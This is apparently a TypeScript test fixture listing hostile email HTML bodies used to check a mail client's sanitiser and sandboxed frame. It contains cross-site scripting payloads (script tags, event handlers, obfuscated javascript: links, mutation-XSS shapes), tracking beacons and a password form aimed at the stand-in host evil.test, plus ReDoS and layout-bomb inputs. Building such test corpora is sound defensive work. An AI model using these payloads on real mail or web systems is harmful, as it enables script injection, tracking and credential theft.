// The hostile-HTML corpus (lane card done criterion 4; research electron-email-html-isolation section 1). Original
// test strings only, no real mail. Every remote host is under `.test` (RFC 2606), so nothing could resolve even if a
// fence failed. Each script or handler tries to touch the host (`parent.aplos`, `top.pwned`), which the Playwright
// spec checks for. Used by sanitise.test.ts (node) and browser/mailframe.browser.spec.ts (headless Chromium).

/** One hostile email body. */
export interface CorpusItem {
  /** Stable id, used in test names. */
  id: string;
  /** The vector, in words. */
  vector: string;
  /** The body HTML as a sender could write it. */
  html: string;
  /** Visible text that must survive sanitising (the email is still readable). */
  keeps?: string;
  /** A resource-exhaustion item: only the sanitiser's caps fence it, so the unsanitised browser pass skips it. */
  costly?: true;
}

const EVIL = 'https://evil.test';
const PWN =
  "parent.pwned=1;top.pwned=1;try{parent.aplos.leak=1}catch(e){};location='https://evil.test/nav'";

function table(rows: number, cols: number): string {
  const row = `<tr>${'<td>cell</td>'.repeat(cols)}</tr>`;
  return `<table>${row.repeat(rows)}</table>`;
}

function nested(depth: number): string {
  return `${'<div>'.repeat(depth)}deep text${'</div>'.repeat(depth)}`;
}

/** The corpus. Order is stable. */
export const CORPUS: readonly CorpusItem[] = [
  {
    id: 'inline-script',
    vector: 'inline <script>, in head and body, with fetch and navigation',
    html: `<html><head><script>${PWN}</script></head><body><p>Hello script</p><script>fetch('${EVIL}/s');${PWN}</script><SCRIPT src="${EVIL}/x.js"></SCRIPT></body></html>`,
    keeps: 'Hello script',
  },
  {
    id: 'event-handlers',
    vector: 'onerror, onload, onmouseover, ontoggle and friends',
    html: `<body onload="${PWN}"><img src="x" onerror="${PWN}"><div onmouseover="${PWN}">Handlers</div><details open ontoggle="${PWN}"><summary>s</summary></details><img src=x ONERROR=${PWN}></body>`,
    keeps: 'Handlers',
  },
  {
    id: 'meta-refresh',
    vector: 'meta refresh to a remote page and to javascript:',
    html: `<meta http-equiv="refresh" content="0;url=${EVIL}/refresh"><meta http-equiv="Refresh" content="0; url=javascript:${PWN}"><p>Refresh</p>`,
    keeps: 'Refresh',
  },
  {
    id: 'link-prefetch',
    vector: '<link> prefetch, preload, dns-prefetch, preconnect, stylesheet, icon',
    html: `<link rel="prefetch" href="${EVIL}/prefetch"><link rel="preload" as="image" href="${EVIL}/preload.png"><link rel="dns-prefetch" href="//dns.evil.test"><link rel="preconnect" href="${EVIL}"><link rel="stylesheet" href="${EVIL}/s.css"><link rel="icon" href="${EVIL}/favicon.ico"><p>Links</p>`,
    keeps: 'Links',
  },
  {
    id: 'url-trackers',
    vector:
      'url() and image trackers in style attributes, background=, pixels, srcset, protocol-relative',
    html: [
      `<div style="background:url(${EVIL}/bg.gif) no-repeat;font-weight:bold">Tracked</div>`,
      `<div style="background-image:url('${EVIL}/q.gif')"></div>`,
      `<ul style="list-style-image:url(&quot;${EVIL}/li.gif&quot;)"><li>i</li></ul>`,
      `<p style="cursor:url(${EVIL}/c.cur),auto">c</p>`,
      `<p style="background:u\\72l(${EVIL}/escaped.gif)">e</p>`,
      `<p style="background:image-set('${EVIL}/set.png' 1x)">s</p>`,
      `<table background="${EVIL}/table.png"><tr><td background="${EVIL}/td.png">t</td></tr></table>`,
      `<img src="${EVIL}/pixel.gif" width="1" height="1">`,
      `<img src="//evil.test/relative-proto.gif">`,
      `<img srcset="${EVIL}/a.png 1x, ${EVIL}/b.png 2x">`,
      `<picture><source srcset="${EVIL}/p.webp"><img src="${EVIL}/p.png"></picture>`,
      `<video poster="${EVIL}/poster.png" src="${EVIL}/v.mp4"></video><audio src="${EVIL}/a.mp3"></audio>`,
      `<input type="image" src="${EVIL}/input.png">`,
      `<a href="https://shop.example/" ping="${EVIL}/ping">Shop</a>`,
    ].join(''),
    keeps: 'Tracked',
  },
  {
    id: 'forms',
    vector: 'forms, inputs, buttons with formaction',
    html: `<form action="${EVIL}/post" method="post"><label>Password <input name="p" type="password"></label><textarea>${'<img src=x onerror=' + PWN + '>'}</textarea><select><option>o</option></select><button formaction="${EVIL}/b">Send</button></form><p>Form text</p>`,
    keeps: 'Form text',
  },
  {
    id: 'css-import',
    vector: 'CSS @import (url, string, escaped, commented), @font-face, expression, binding',
    html: `<style>@import url(${EVIL}/i.css);@import "${EVIL}/j.css";@\\69mport '${EVIL}/k.css';@im/**/port '${EVIL}/l.css';@font-face{font-family:x;src:url(${EVIL}/f.woff)}body{background:url("${EVIL}/body.gif")}p{width:expression(${PWN})}div{-moz-binding:url(${EVIL}/x.xml#x);behavior:url(${EVIL}/x.htc)}</style><p>Styled</p>`,
    keeps: 'Styled',
  },
  {
    id: 'svg-use',
    vector: 'SVG <use>, <image>, <foreignObject>, script and animate inside SVG',
    html: `<svg xmlns="http://www.w3.org/2000/svg"><use href="${EVIL}/sprite.svg#a"/><use xlink:href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=#a"/><image href="${EVIL}/svg.png"/><foreignObject><img src="${EVIL}/fo.png"></foreignObject><script>${PWN}</script><animate attributeName="href" to="javascript:${PWN}"/></svg><use href="${EVIL}/loose.svg#a"></use><p>After SVG</p>`,
    keeps: 'After SVG',
  },
  {
    id: 'base',
    vector: '<base href> rebasing relative images and links',
    html: `<base href="${EVIL}/"><img src="relative.png"><a href="relative/page">Relative link</a>`,
    keeps: 'Relative link',
  },
  {
    id: 'meta-http-equiv',
    vector: '<meta http-equiv> CSP override, set-cookie, content-type',
    html: `<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'"><meta http-equiv="set-cookie" content="a=b"><meta http-equiv="content-type" content="text/html; charset=utf-7"><p>Meta</p>`,
    keeps: 'Meta',
  },
  {
    id: 'javascript-links',
    vector:
      'javascript:, vbscript:, data: links, entity- and whitespace-obfuscated schemes, credentials',
    html: [
      `<a href="javascript:${PWN}">js</a>`,
      `<a href="JaVaScRiPt&colon;${PWN}">mixed case entity</a>`,
      `<a href=" &#x6a;avascript:${PWN}">hex entity</a>`,
      `<a href="java&#9;script:${PWN}">tab</a>`,
      `<a href="vbscript:msgbox(1)">vb</a>`,
      `<a href="data:text/html,<script>${PWN}</script>">data</a>`,
      `<a href="https://user:pass@evil.test/">creds</a>`,
      `<a href="https://safe.example/path?q=1" target="_self">Safe link</a>`,
    ].join(' '),
    keeps: 'Safe link',
  },
  {
    id: 'giant-table',
    vector: 'a table of 6,400 cells (over the 5,000 cap)',
    html: table(80, 80),
    keeps: 'cell',
  },
  {
    id: 'deep-nesting',
    vector: '400 nested divs (over the 200 cap)',
    html: nested(400),
    keeps: 'deep text',
  },
  {
    id: 'embedded-content',
    vector: 'iframe, frame, object, embed, applet, portal',
    html: `<iframe src="${EVIL}/frame" srcdoc="<script>${PWN}</script>"></iframe><object data="${EVIL}/o.swf"></object><embed src="${EVIL}/e.swf"><applet code="x"></applet><portal src="${EVIL}/portal"></portal><p>Embedded</p>`,
    keeps: 'Embedded',
  },
  {
    id: 'redos-css',
    vector:
      'CSS built to make backtracking patterns quadratic: 200,000 letters, url( and 40,000 spaces, unclosed comments',
    html: [
      `<style>p{font-family:${'a'.repeat(200_000)}}b{background:url(${' '.repeat(40_000)}}`,
      `i{x:${'/*x'.repeat(10_000)}</style>`,
      `<p style="background:url(${' '.repeat(40_000)}">Still readable</p>`,
    ].join(''),
    keeps: 'Still readable',
  },
  {
    id: 'span-bomb',
    vector: '4,999 cells with colspan and rowspan of 1,000 (seconds of layout without the clamp)',
    html: `<table>${'<tr><td colspan="1000" rowspan="1000">span</td></tr>'.repeat(4_999)}</table>`,
    keeps: 'span',
    costly: true,
  },
  {
    id: 'css-override',
    vector:
      "email CSS aimed at the host: beat the measuring rules, declare the host's layer, hide notices and marks",
    html: [
      '<body style="height:2px!important;overflow:auto!important"><style>',
      '@layer aplos{html{height:5px!important}}',
      ':root{height:7px!important;max-height:7px!important;overflow:auto!important}',
      'html body{position:absolute!important;height:3px!important;overflow:scroll!important}',
      '.aplos-notice,p[class],mark{display:none!important}',
      '</style><div style="height:600px">Tall letter</div></body>',
    ].join(''),
    keeps: 'Tall letter',
  },
  {
    id: 'parser-differentials',
    vector: 'mutation-XSS shapes: style breakouts, comments, noscript, template, math, xmp, CDATA',
    html: [
      `<style>a{font-weight:bold}</style><script>${PWN}</script>`,
      `<style>/*</style><img src=x onerror="${PWN}">*/</style>`,
      `<!--><img src=x onerror="${PWN}">-->`,
      `<noscript><img src="${EVIL}/noscript.png"></noscript>`,
      `<template><img src=x onerror="${PWN}"></template>`,
      `<math><mtext><table><mglyph><style><img src=x onerror="${PWN}"></style></mglyph></table></mtext></math>`,
      `<xmp><img src=x onerror="${PWN}"></xmp>`,
      `<![CDATA[<img src=x onerror="${PWN}">]]>`,
      `<p title="</p><img src=x onerror=${PWN}>">Differential</p>`,
    ].join(''),
    keeps: 'Differential',
  },
];
